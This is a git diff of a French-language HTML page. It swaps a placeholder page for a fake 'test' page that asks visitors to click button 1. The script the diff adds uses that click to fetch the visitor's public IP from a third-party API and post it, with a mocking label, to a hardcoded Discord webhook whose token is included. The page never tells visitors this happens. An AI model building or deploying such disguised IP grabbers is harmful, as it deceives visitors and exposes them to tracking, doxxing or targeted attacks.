@@ -3,17 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test du website</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Veillez cliquer sur le bouton 1 pour effectuer le test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 400px;
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        button {
+            padding: 10px 20px;
+            margin: 10px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        #message {
+            margin-top: 20px;
+            font-weight: bold;
+            color: green;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <h1>buihger</h1>
-        <p>bujihogrez</p>
-        <button id="accept">Accepter</button>
-        <button id="decline">Refuser</button>
+        <h1>Veillez cliquer sur le bouton 1 pour effectuer le test</h1>
+        <p>Veillez cliquer sur le bouton 1 pour effectuer le test</p>
+        <button id="accept">1</button>
+        <button id="decline">2</button>
         <div id="message"></div>
     </div>
-    <script src="script.js"></script>
+    <script>
+        document.getElementById('accept').addEventListener('click', async () => {
+            // Récupérer l'IP de l'utilisateur avec une API tierce
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const userIP = data.ip;
+
+            // Envoyer l'IP au webhook Discord
+            const webhookURL = "https://discord.com/api/webhooks/1301961339538767963/dd6TXhd93HceCHh2fnrcTY_dHvoEGASxuUHFepmle3e1wiBHi529IrQMweYFuCb9rtH0";
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `Neuille : ${userIP}`
+                })
+            });
+
+            document.getElementById('message').textContent = "Merci !";
+        });
+
+        document.getElementById('decline').addEventListener('click', () => {
+            document.getElementById('message').textContent = "Refaites le test";
+        });
+    </script>
 </body>
 </html>
